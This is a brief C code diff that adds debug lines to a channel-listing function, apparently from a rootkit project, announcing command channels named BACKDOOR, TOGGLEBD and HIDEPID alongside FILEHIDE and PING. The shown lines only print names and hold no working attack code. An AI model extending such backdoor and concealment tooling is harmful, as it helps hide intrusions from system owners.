@@ -21,6 +21,9 @@ report_channels(void)
     DEBUG_NOTICE("listening on the following channels\n");
     DEBUG_NOTICE("%-24s %#10lx\n", "PING",     G7_PING);
     DEBUG_NOTICE("%-24s %#10lx\n", "FILEHIDE", G7_FILEHIDE);
+    DEBUG_NOTICE("%-24s %#10lx\n", "BACKDOOR", G7_BACKDOOR);
+    DEBUG_NOTICE("%-24s %#10lx\n", "TOGGLEBD", G7_TOGGLEBD);
+    DEBUG_NOTICE("%-24s %#10lx\n", "HIDEPID",  G7_HIDEPID);
     DEBUG_NOTICE("-----------------------------------\n");
 }
 
